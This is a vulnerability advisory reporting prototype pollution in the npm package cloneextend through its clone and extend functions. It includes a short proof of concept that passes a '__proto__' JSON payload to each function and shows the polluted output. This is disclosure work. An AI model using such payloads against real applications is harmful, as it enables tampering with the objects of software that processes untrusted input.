---
title: Prototype pollution in cloneextend
date: 2021-06-28
tags:
	- "npm"
	- "prototype-pollution"
advisory: true
origin: https://advisory.checkmarx.net/advisory/CX-2021-4799/
cves:
---
## Summary
Affected versions of cloneextend (npm) are vulnerable to prototype pollution via the clone and extend functions.

## Product
All versions of cloneextend npm package.

## Impact
If untrusted data reaches one of the affected functions, prototype pollution can be achieved. The impact will depend on the application.

## Steps to reproduce
```js
var ce = require('cloneextend');
ce.extend({},JSON.parse('{"__proto__":{"polluted":1}}'))
console.log({}.polluted)
>1
 
ce.clone(JSON.parse('{"__proto__":{"a":1}}'))
console.log({}.a)
>1
```

### Expected result:
1 will be printed to the console.

## Remediation
Currently no fix has been released. As a workaround, avoid passing untrusted inputs to the vulnerable functions.

## Credit
This issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).

## Resources
1. [NPM Package](https://www.npmjs.com/package/cloneextend)
